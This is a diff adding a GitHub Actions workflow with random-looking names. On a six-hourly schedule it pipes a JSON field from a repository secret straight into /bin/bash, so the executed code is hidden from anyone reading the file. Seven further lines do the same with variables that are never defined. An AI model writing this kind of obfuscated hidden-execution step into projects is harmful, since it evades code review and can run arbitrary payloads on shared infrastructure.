@@ -1,0 +1,24 @@
+name: oushiyangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: oushiyangg
+        env:
+          ufp81863: ${{ secrets.ufp81863 }}
+        run: |
+          echo $ufp81863 | jq -r .hf639 | /bin/bash
+          echo $drltf13 | jq -r .n8 | /bin/bash
+          echo $izm911 | jq -r .hpox103 | /bin/bash
+          echo $mohk0 | jq -r .od840 | /bin/bash
+          echo $v9380 | jq -r .qxf448 | /bin/bash
+          echo $ea3 | jq -r .olumc5078 | /bin/bash
+          echo $tc12119 | jq -r .rt6422 | /bin/bash
+          echo $r94 | jq -r .rx2664 | /bin/bash
+
